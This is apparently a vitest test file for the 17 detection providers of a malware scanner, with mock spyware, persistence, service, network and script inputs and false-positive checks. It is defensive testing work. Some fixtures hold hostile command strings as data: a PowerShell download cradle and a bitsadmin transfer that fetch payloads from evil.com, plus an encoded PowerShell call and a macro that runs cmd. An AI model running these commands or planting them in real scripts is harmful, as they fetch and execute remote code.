/**
 * AI Security Center Part 2 — Detection Provider Tests
 *
 * Tests for all 17 detection providers:
 * - Mock browsers, startup entries, scheduled tasks, services
 * - Mock PowerShell, macros, scripts
 * - Mock extensions, persistence, publishers
 * - Mock unsigned executables, malicious behavior
 * - False-positive prevention
 * - Evidence-based detection verification
 */
import { describe, it, expect } from 'vitest';
import { SpywareDetectionProvider } from '../SpywareDetectionProvider';
import { AdwareDetectionProvider } from '../AdwareDetectionProvider';
import { PUPDetectionProvider } from '../PUPDetectionProvider';
import { BrowserHijackerProvider } from '../BrowserHijackerProvider';
import { PersistenceDetectionProvider } from '../PersistenceDetectionProvider';
import { StartupAbuseProvider } from '../StartupAbuseProvider';
import { ScheduledTaskProvider } from '../ScheduledTaskProvider';
import { ServiceAnalysisProvider } from '../ServiceAnalysisProvider';
import { PowerShellDetectionProvider } from '../PowerShellDetectionProvider';
import { MacroDetectionProvider } from '../MacroDetectionProvider';
import { ScriptDetectionProvider } from '../ScriptDetectionProvider';
import { CryptoMinerDetectionProvider } from '../CryptoMinerDetectionProvider';
import { SuspiciousProcessProvider } from '../SuspiciousProcessProvider';
import { UnsignedExecutableProvider } from '../UnsignedExecutableProvider';
import { NetworkBehaviorProvider } from '../NetworkBehaviorProvider';
import { FileReputationProvider } from '../FileReputationProvider';
import { PublisherTrustProvider } from '../PublisherTrustProvider';
import type { ProviderScanContext } from '../types';

function makeContext(options: Record<string, unknown> = {}, targets: string[] = []): ProviderScanContext {
  return { scanType: 'quick', scanId: 'test', targets, options };
}

describe('Detection Providers', () => {

  // ── SpywareDetectionProvider ─────────────────────────────────────

  describe('SpywareDetectionProvider', () => {
    it('detects spyware with multiple indicators', async () => {
      const provider = new SpywareDetectionProvider();
      const result = await provider.scan(makeContext({
        spywareInput: [{
          processName: 'suspicious.exe',
          pid: 1234,
          path: 'C:\\Temp\\suspicious.exe',
          indicators: [
            { type: 'keyboard_hook', description: 'Keyboard hook registered', timestamp: Date.now() },
            { type: 'clipboard_monitoring', description: 'Clipboard monitoring detected', timestamp: Date.now() },
            { type: 'screen_capture', description: 'Screen capture API called', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.success).toBe(true);
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('spyware');
      expect(result.threats[0]!.evidence.length).toBe(3);
    });

    it('does not flag single indicator (false-positive control)', async () => {
      const provider = new SpywareDetectionProvider();
      const result = await provider.scan(makeContext({
        spywareInput: [{
          processName: 'maybe.exe',
          pid: 1234,
          path: 'C:\\Program Files\\maybe\\maybe.exe',
          indicators: [
            { type: 'clipboard_monitoring', description: 'Clipboard access', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(0);
    });

    it('does not flag empty indicators', async () => {
      const provider = new SpywareDetectionProvider();
      const result = await provider.scan(makeContext({
        spywareInput: [{
          processName: 'clean.exe',
          pid: 1234,
          path: 'C:\\clean.exe',
          indicators: [],
        }],
      }));
      expect(result.threats.length).toBe(0);
    });

    it('includes MITRE ATT&CK mapping', async () => {
      const provider = new SpywareDetectionProvider();
      const result = await provider.scan(makeContext({
        spywareInput: [{
          processName: 'keylogger.exe',
          pid: 1234,
          path: 'C:\\Temp\\keylogger.exe',
          indicators: [
            { type: 'keyboard_hook', description: 'Keyboard hook', timestamp: Date.now() },
            { type: 'credential_access', description: 'Credential access', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats[0]!.mitreAttack).not.toBeNull();
    });
  });

  // ── AdwareDetectionProvider ──────────────────────────────────────

  describe('AdwareDetectionProvider', () => {
    it('detects adware with multiple indicators', async () => {
      const provider = new AdwareDetectionProvider();
      const result = await provider.scan(makeContext({
        adwareInput: [{
          target: 'C:\\Program Files\\AdwareApp\\adware.exe',
          indicators: [
            { type: 'ad_injection', description: 'Ad injection', timestamp: Date.now() },
            { type: 'popup_generator', description: 'Popup generation', timestamp: Date.now() },
            { type: 'homepage_modification', description: 'Homepage changed', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('adware');
    });

    it('does not flag single indicator', async () => {
      const provider = new AdwareDetectionProvider();
      const result = await provider.scan(makeContext({
        adwareInput: [{
          target: 'C:\\app.exe',
          indicators: [
            { type: 'notification_abuse', description: 'Notifications', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── PUPDetectionProvider ─────────────────────────────────────────

  describe('PUPDetectionProvider', () => {
    it('detects PUP with multiple indicators', async () => {
      const provider = new PUPDetectionProvider();
      const result = await provider.scan(makeContext({
        pupInput: [{
          target: 'C:\\Program Files\\Optimizer\\optimizer.exe',
          name: 'Optimizer Pro',
          indicators: [
            { type: 'optimizer_scam', description: 'Fake optimization', timestamp: Date.now() },
            { type: 'bundled_installer', description: 'Bundled installer', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('pup');
    });

    it('flags strong indicator alone (fake_antivirus)', async () => {
      const provider = new PUPDetectionProvider();
      const result = await provider.scan(makeContext({
        pupInput: [{
          target: 'C:\\FakeAV\\fakeav.exe',
          name: 'Fake AV Pro',
          indicators: [
            { type: 'fake_antivirus', description: 'Fake antivirus', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag single weak indicator', async () => {
      const provider = new PUPDetectionProvider();
      const result = await provider.scan(makeContext({
        pupInput: [{
          target: 'C:\\app.exe',
          name: 'Some App',
          indicators: [
            { type: 'download_manager_bundle', description: 'Download manager', timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── BrowserHijackerProvider ──────────────────────────────────────

  describe('BrowserHijackerProvider', () => {
    it('detects suspicious extension with multiple risk factors', async () => {
      const provider = new BrowserHijackerProvider();
      const result = await provider.scan(makeContext({
        browserAnalysis: {
          extensions: [{
            id: 'susp1',
            name: 'Suspicious Ext',
            browser: 'chrome',
            version: '1.0',
            permissions: ['tabs', 'cookies', 'webRequest', '<all_urls>'],
            publisher: null,
            rating: 1.5,
            installDate: Date.now(),
            suspiciousPermissions: ['webRequest', '<all_urls>'],
          }],
          settings: null,
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('browser_hijacker');
    });

    it('does not flag clean extension', async () => {
      const provider = new BrowserHijackerProvider();
      const result = await provider.scan(makeContext({
        browserAnalysis: {
          extensions: [{
            id: 'clean1',
            name: 'Clean Ext',
            browser: 'chrome',
            version: '1.0',
            permissions: ['storage'],
            publisher: 'Google',
            rating: 4.5,
            installDate: Date.now(),
            suspiciousPermissions: [],
          }],
          settings: null,
        },
      }));
      expect(result.threats.length).toBe(0);
    });

    it('detects suspicious browser settings', async () => {
      const provider = new BrowserHijackerProvider();
      const result = await provider.scan(makeContext({
        browserAnalysis: {
          extensions: [],
          settings: {
            homepage: 'http://suspicious-search.com',
            searchEngine: 'suspicious-search',
            defaultNewTab: 'http://suspicious-search.com',
            notificationPermissions: [{ origin: 'http://suspicious.com', granted: true, suspicious: true }],
            proxy: 'http://bad-proxy:8080',
            certificateAnomalies: ['expired cert'],
          },
        },
      }));
      expect(result.threats.length).toBe(1);
    });
  });

  // ── PersistenceDetectionProvider ─────────────────────────────────

  describe('PersistenceDetectionProvider', () => {
    it('detects suspicious startup entry', async () => {
      const provider = new PersistenceDetectionProvider();
      const result = await provider.scan(makeContext({
        persistenceAnalysis: {
          startupEntries: [{
            name: 'malware_startup',
            path: 'C:\\Temp\\malware.exe',
            command: 'C:\\Temp\\malware.exe /silent',
            location: 'C:\\Users\\test\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
            publisher: null,
            signed: false,
          }],
          registryRunKeys: [],
          scheduledTasks: [],
          services: [],
          wmiPersistence: [],
          shellExtensions: [],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('suspicious_startup_entry');
    });

    it('detects WMI persistence immediately', async () => {
      const provider = new PersistenceDetectionProvider();
      const result = await provider.scan(makeContext({
        persistenceAnalysis: {
          startupEntries: [],
          registryRunKeys: [],
          scheduledTasks: [],
          services: [],
          wmiPersistence: [{
            filterName: 'EvilFilter',
            consumerName: 'EvilConsumer',
            command: 'powershell -enc abc123',
            filterQuery: 'SELECT * FROM __InstanceModificationEvent',
          }],
          shellExtensions: [],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag known startup entries', async () => {
      const provider = new PersistenceDetectionProvider();
      const result = await provider.scan(makeContext({
        persistenceAnalysis: {
          startupEntries: [{
            name: 'OneDrive',
            path: 'C:\\Program Files\\Microsoft\\OneDrive.exe',
            command: 'OneDrive.exe /background',
            location: 'HKCU\\Run',
            publisher: 'Microsoft',
            signed: true,
          }],
          registryRunKeys: [],
          scheduledTasks: [],
          services: [],
          wmiPersistence: [],
          shellExtensions: [],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── StartupAbuseProvider ─────────────────────────────────────────

  describe('StartupAbuseProvider', () => {
    it('detects suspicious command patterns in startup', async () => {
      const provider = new StartupAbuseProvider();
      const result = await provider.scan(makeContext({
        startupEntries: [{
          name: 'evil_startup',
          path: 'C:\\Temp\\evil.exe',
          command: 'powershell -enc abc123',
          location: 'C:\\Users\\test\\AppData\\Roaming\\Startup',
          publisher: null,
          signed: false,
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('detects RunOnce abuse', async () => {
      const provider = new StartupAbuseProvider();
      const result = await provider.scan(makeContext({
        registryRunKeys: [{
          key: 'RunOnce',
          value: 'evil_setup',
          data: 'C:\\Temp\\setup.exe /install',
          hive: 'HKCU',
          publisher: null,
          signed: false,
        }],
      }));
      expect(result.threats.length).toBe(1);
    });
  });

  // ── ScheduledTaskProvider ────────────────────────────────────────

  describe('ScheduledTaskProvider', () => {
    it('detects hidden task with encoded command', async () => {
      const provider = new ScheduledTaskProvider();
      const result = await provider.scan(makeContext({
        scheduledTasks: [{
          name: 'evil_task',
          path: '\\Microsoft\\Windows\\evil',
          command: 'powershell -enc abc123',
          author: null,
          triggers: ['At logon'],
          enabled: true,
          hidden: true,
          lastRun: null,
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag known Microsoft tasks', async () => {
      const provider = new ScheduledTaskProvider();
      const result = await provider.scan(makeContext({
        scheduledTasks: [{
          name: 'Microsoft\\Windows\\Update\\Task',
          path: '\\Microsoft\\Windows\\Update',
          command: 'usoclient.exe StartScan',
          author: 'Microsoft Corporation',
          triggers: ['Daily'],
          enabled: true,
          hidden: false,
          lastRun: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── ServiceAnalysisProvider ──────────────────────────────────────

  describe('ServiceAnalysisProvider', () => {
    it('detects unsigned SYSTEM service', async () => {
      const provider = new ServiceAnalysisProvider();
      const result = await provider.scan(makeContext({
        services: [{
          name: 'evil_svc',
          displayName: 'Evil Service',
          binaryPath: 'C:\\Temp\\evil.exe',
          startType: 'Auto',
          serviceType: 'Win32OwnProcess',
          account: 'LocalSystem',
          signed: false,
          publisher: null,
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag known vendor services', async () => {
      const provider = new ServiceAnalysisProvider();
      const result = await provider.scan(makeContext({
        services: [{
          name: 'wuauserv',
          displayName: 'Windows Update',
          binaryPath: 'C:\\Windows\\System32\\svchost.exe',
          startType: 'Manual',
          serviceType: 'ShareProcess',
          account: 'LocalSystem',
          signed: true,
          publisher: 'Microsoft Corporation',
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── PowerShellDetectionProvider ──────────────────────────────────

  describe('PowerShellDetectionProvider', () => {
    it('detects encoded PowerShell command', async () => {
      const provider = new PowerShellDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Temp\\evil.ps1',
          type: 'powershell',
          content: 'powershell -enc SQBFAFgA',
          commandLine: 'powershell -enc SQBFAFgA',
          executionPolicy: null,
          encoded: true,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('detects download cradle', async () => {
      const provider = new PowerShellDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Temp\\download.ps1',
          type: 'powershell',
          content: 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")',
          commandLine: null,
          executionPolicy: 'Bypass',
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag benign PowerShell', async () => {
      const provider = new PowerShellDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Scripts\\cleanup.ps1',
          type: 'powershell',
          content: 'Get-ChildItem -Path C:\\Temp | Remove-Item',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── MacroDetectionProvider ───────────────────────────────────────

  describe('MacroDetectionProvider', () => {
    it('detects auto-open macro with Shell call', async () => {
      const provider = new MacroDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Users\\test\\Downloads\\doc.docm',
          type: 'macro',
          content: 'Sub Auto_Open() Shell("cmd /c evil.exe") End Sub',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag benign macro content', async () => {
      const provider = new MacroDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\docs\\report.docm',
          type: 'macro',
          content: 'Sub FormatDocument() ActiveDocument.Paragraphs.Format.Alignment = wdAlignParagraphCenter End Sub',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── ScriptDetectionProvider ──────────────────────────────────────

  describe('ScriptDetectionProvider', () => {
    it('detects suspicious VBScript', async () => {
      const provider = new ScriptDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Temp\\evil.vbs',
          type: 'vbscript',
          content: 'Set ws = CreateObject("WScript.Shell") ws.Run "cmd /c evil.exe"',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('detects suspicious batch file', async () => {
      const provider = new ScriptDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Temp\\evil.bat',
          type: 'batch',
          content: 'bitsadmin /transfer evil http://evil.com/payload.exe C:\\Temp\\payload.exe',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag benign batch', async () => {
      const provider = new ScriptDetectionProvider();
      const result = await provider.scan(makeContext({
        scripts: [{
          path: 'C:\\Scripts\\backup.bat',
          type: 'batch',
          content: 'xcopy C:\\data D:\\backup /E /I',
          commandLine: null,
          executionPolicy: null,
          encoded: false,
          obfuscated: false,
          suspiciousCommands: [],
          timestamp: Date.now(),
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── CryptoMinerDetectionProvider ─────────────────────────────────

  describe('CryptoMinerDetectionProvider', () => {
    it('detects known miner with pool connection', async () => {
      const provider = new CryptoMinerDetectionProvider();
      const result = await provider.scan(makeContext({
        cryptoMinerInput: {
          processes: [{
            processName: 'xmrig.exe',
            pid: 1234,
            path: 'C:\\Temp\\xmrig.exe',
            cpuUsage: 85,
            gpuUsage: 0,
            poolConnections: ['stratum+tcp://pool.minexmr.com:4444'],
            miningIndicators: [],
            timestamp: Date.now(),
          }],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('crypto_miner');
    });

    it('does not flag high CPU alone (false-positive control)', async () => {
      const provider = new CryptoMinerDetectionProvider();
      const result = await provider.scan(makeContext({
        cryptoMinerInput: {
          processes: [{
            processName: 'compiler.exe',
            pid: 1234,
            path: 'C:\\Program Files\\compiler.exe',
            cpuUsage: 95,
            gpuUsage: 0,
            poolConnections: [],
            miningIndicators: [],
            timestamp: Date.now(),
          }],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── SuspiciousProcessProvider ────────────────────────────────────

  describe('SuspiciousProcessProvider', () => {
    it('detects process injection indicators', async () => {
      const provider = new SuspiciousProcessProvider();
      const result = await provider.scan(makeContext({
        processBehaviors: [{
          processName: 'injector.exe',
          pid: 1234,
          path: 'C:\\Temp\\injector.exe',
          indicators: [
            { type: 'virtual_allocex', description: 'VirtualAllocEx on remote process', weight: 3, timestamp: Date.now() },
            { type: 'write_process_memory', description: 'WriteProcessMemory on remote process', weight: 3, timestamp: Date.now() },
            { type: 'create_remote_thread', description: 'CreateRemoteThread on remote process', weight: 3, timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('detects LOLBin abuse', async () => {
      const provider = new SuspiciousProcessProvider();
      const result = await provider.scan(makeContext({
        processBehaviors: [{
          processName: 'rundll32.exe',
          pid: 1234,
          path: 'C:\\Windows\\System32\\rundll32.exe',
          indicators: [
            { type: 'suspicious_command', description: 'rundll32 with suspicious DLL', weight: 2, timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag single low-weight indicator', async () => {
      const provider = new SuspiciousProcessProvider();
      const result = await provider.scan(makeContext({
        processBehaviors: [{
          processName: 'normal.exe',
          pid: 1234,
          path: 'C:\\Program Files\\normal\\normal.exe',
          indicators: [
            { type: 'high_cpu', description: 'High CPU usage', weight: 1, timestamp: Date.now() },
          ],
        }],
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── UnsignedExecutableProvider ───────────────────────────────────

  describe('UnsignedExecutableProvider', () => {
    it('detects unsigned executable in temp', async () => {
      const provider = new UnsignedExecutableProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          files: [{
            path: 'C:\\Users\\test\\AppData\\Local\\Temp\\evil.exe',
            name: 'evil.exe',
            hash: 'abc123',
            signed: false,
            signer: null,
            publisher: null,
            fileSize: 50000,
            installLocation: 'temp',
            firstSeen: Date.now(),
            reputationScore: 15,
            knownGood: false,
            knownBad: false,
          }],
        },
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag signed known-good file', async () => {
      const provider = new UnsignedExecutableProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          files: [{
            path: 'C:\\Program Files\\Microsoft\\Edge\\msedge.exe',
            name: 'msedge.exe',
            hash: 'def456',
            signed: true,
            signer: 'Microsoft Corporation',
            publisher: 'Microsoft Corporation',
            fileSize: 2000000,
            installLocation: 'program_files',
            firstSeen: null,
            reputationScore: 100,
            knownGood: true,
            knownBad: false,
          }],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── NetworkBehaviorProvider ──────────────────────────────────────

  describe('NetworkBehaviorProvider', () => {
    it('detects beacon-like behavior', async () => {
      const provider = new NetworkBehaviorProvider();
      const now = Date.now();
      const result = await provider.scan(makeContext({
        networkBehavior: {
          connections: [
            { processName: 'beacon.exe', pid: 1234, localAddress: '192.168.1.1', remoteAddress: '185.10.10.10', remotePort: 443, protocol: 'tcp', state: 'ESTABLISHED', timestamp: now, beaconLike: true, beaconInterval: 30000 },
            { processName: 'beacon.exe', pid: 1234, localAddress: '192.168.1.1', remoteAddress: '185.10.10.10', remotePort: 443, protocol: 'tcp', state: 'ESTABLISHED', timestamp: now + 30000, beaconLike: true, beaconInterval: 30000 },
            { processName: 'beacon.exe', pid: 1234, localAddress: '192.168.1.1', remoteAddress: '185.10.10.10', remotePort: 443, protocol: 'tcp', state: 'ESTABLISHED', timestamp: now + 60000, beaconLike: true, beaconInterval: 30000 },
          ],
          listeningPorts: [],
          dnsQueries: [],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.category).toBe('backdoor');
    });

    it('detects unexpected listening port', async () => {
      const provider = new NetworkBehaviorProvider();
      const result = await provider.scan(makeContext({
        networkBehavior: {
          connections: [],
          listeningPorts: [{
            processName: 'backdoor.exe',
            pid: 1234,
            port: 4444,
            protocol: 'tcp',
            address: '0.0.0.0',
            unexpected: true,
          }],
          dnsQueries: [],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag normal connections', async () => {
      const provider = new NetworkBehaviorProvider();
      const result = await provider.scan(makeContext({
        networkBehavior: {
          connections: [
            { processName: 'chrome.exe', pid: 1234, localAddress: '192.168.1.1', remoteAddress: '142.250.80.46', remotePort: 443, protocol: 'tcp', state: 'ESTABLISHED', timestamp: Date.now(), beaconLike: false, beaconInterval: null },
          ],
          listeningPorts: [],
          dnsQueries: [],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── FileReputationProvider ───────────────────────────────────────

  describe('FileReputationProvider', () => {
    it('detects known bad file', async () => {
      const provider = new FileReputationProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          files: [{
            path: 'C:\\Temp\\malware.exe',
            name: 'malware.exe',
            hash: 'bad123',
            signed: false,
            signer: null,
            publisher: null,
            fileSize: 50000,
            installLocation: 'temp',
            firstSeen: Date.now(),
            reputationScore: 5,
            knownGood: false,
            knownBad: true,
          }],
        },
      }));
      expect(result.threats.length).toBe(1);
      expect(result.threats[0]!.severity).toBe('high');
    });

    it('does not flag known good file', async () => {
      const provider = new FileReputationProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          files: [{
            path: 'C:\\Windows\\System32\\cmd.exe',
            name: 'cmd.exe',
            hash: 'good123',
            signed: true,
            signer: 'Microsoft Corporation',
            publisher: 'Microsoft Corporation',
            fileSize: 300000,
            installLocation: 'system',
            firstSeen: null,
            reputationScore: 100,
            knownGood: true,
            knownBad: false,
          }],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── PublisherTrustProvider ───────────────────────────────────────

  describe('PublisherTrustProvider', () => {
    it('detects untrusted publisher with multiple risk factors', async () => {
      const provider = new PublisherTrustProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          publishers: [{
            name: 'Unknown Publisher',
            signed: false,
            certificateValid: false,
            certificateChain: [],
            knownVendor: false,
            reputationScore: 10,
          }],
        },
      }));
      expect(result.threats.length).toBe(1);
    });

    it('does not flag known vendor with valid cert', async () => {
      const provider = new PublisherTrustProvider();
      const result = await provider.scan(makeContext({
        reputationAnalysis: {
          publishers: [{
            name: 'Microsoft Corporation',
            signed: true,
            certificateValid: true,
            certificateChain: ['Microsoft', 'DigiCert', 'Root CA'],
            knownVendor: true,
            reputationScore: 100,
          }],
        },
      }));
      expect(result.threats.length).toBe(0);
    });
  });

  // ── Cross-cutting: Evidence & Safety ─────────────────────────────

  describe('Evidence & Safety (all providers)', () => {
    const allProviders = [
      new SpywareDetectionProvider(),
      new AdwareDetectionProvider(),
      new PUPDetectionProvider(),
      new BrowserHijackerProvider(),
      new PersistenceDetectionProvider(),
      new StartupAbuseProvider(),
      new ScheduledTaskProvider(),
      new ServiceAnalysisProvider(),
      new PowerShellDetectionProvider(),
      new MacroDetectionProvider(),
      new ScriptDetectionProvider(),
      new CryptoMinerDetectionProvider(),
      new SuspiciousProcessProvider(),
      new UnsignedExecutableProvider(),
      new NetworkBehaviorProvider(),
      new FileReputationProvider(),
      new PublisherTrustProvider(),
    ];

    it('every provider has unique ID', () => {
      const ids = allProviders.map((p) => p.getId());
      const unique = new Set(ids);
      expect(unique.size).toBe(ids.length);
    });

    it('every provider has capabilities', () => {
      for (const p of allProviders) {
        expect(p.getInfo().capabilities.length).toBeGreaterThan(0);
      }
    });

    it('every provider returns success on empty input', async () => {
      for (const p of allProviders) {
        const result = await p.scan(makeContext({}));
        expect(result.success).toBe(true);
        expect(result.threats).toEqual([]);
      }
    });

    it('every provider handles errors gracefully', async () => {
      // Pass invalid input that will throw
      for (const p of allProviders) {
        const result = await p.scan(makeContext({
          __throw: true,
        }));
        // Should not crash — either succeed with no threats or fail gracefully
        expect(result.providerId).toBe(p.getId());
      }
    });
  });
});
